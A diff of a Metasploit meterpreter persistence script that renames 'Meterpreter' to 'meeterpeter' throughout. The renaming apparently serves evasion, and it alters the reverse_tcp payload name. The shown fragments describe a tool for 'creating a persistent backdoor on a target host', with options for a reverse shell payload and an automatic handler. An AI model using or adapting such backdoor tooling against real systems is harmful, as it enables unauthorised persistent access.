@@ -3,12 +3,12 @@
 ################## Variable Declarations ##################
 
 ##
-# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# WARNING: Metasploit no longer maintains or accepts meeterpeter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
-# Meterpreter Session
+# meeterpeter Session
 @client = client
 
 key = "HKLM"
@@ -22,7 +22,7 @@ autoconn = false
 serv = false
 altexe = nil
 target_dir = nil
-payload_type = "windows/meterpreter/reverse_tcp"
+payload_type = "windows/meeterpeter/reverse_tcp"
 script = nil
 script_on_target = nil
 
@@ -38,7 +38,7 @@ script_on_target = nil
   "-A"  => [ false,  "Automatically start a matching exploit/multi/handler to connect to the agent"],
   "-L"  => [ true,   "Location in target host to write payload to, if none \%TEMP\% will be used."],
   "-T"  => [ true,   "Alternate executable template to use"],
-  "-P"  => [ true,   "Payload to use, default is windows/meterpreter/reverse_tcp."]
+  "-P"  => [ true,   "Payload to use, default is windows/meeterpeter/reverse_tcp."]
 )
 meter_type = client.platform
 
@@ -47,15 +47,15 @@ meter_type = client.platform
 # Usage Message Function
 #-------------------------------------------------------------------------------
 def usage
-  print_line "Meterpreter Script for creating a persistent backdoor on a target host."
+  print_line "meeterpeter Script for creating a persistent backdoor on a target host."
   print_line(@exec_opts.usage)
   raise Rex::Script::Completed
 end
 
-# Wrong Meterpreter Version Message Function
+# Wrong meeterpeter Version Message Function
 #-------------------------------------------------------------------------------
 def wrong_meter_version(meter = meter_type)
-  print_error("#{meter} version of Meterpreter is not supported with this Script!")
+  print_error("#{meter} version of meeterpeter is not supported with this Script!")
   raise Rex::Script::Completed
 end
 
@@ -226,7 +226,7 @@ end
   end
 }
 
-# Check for Version of Meterpreter
+# Check for Version of meeterpeter
 wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
 print_status("Running Persistance Script")
 # Create undo script
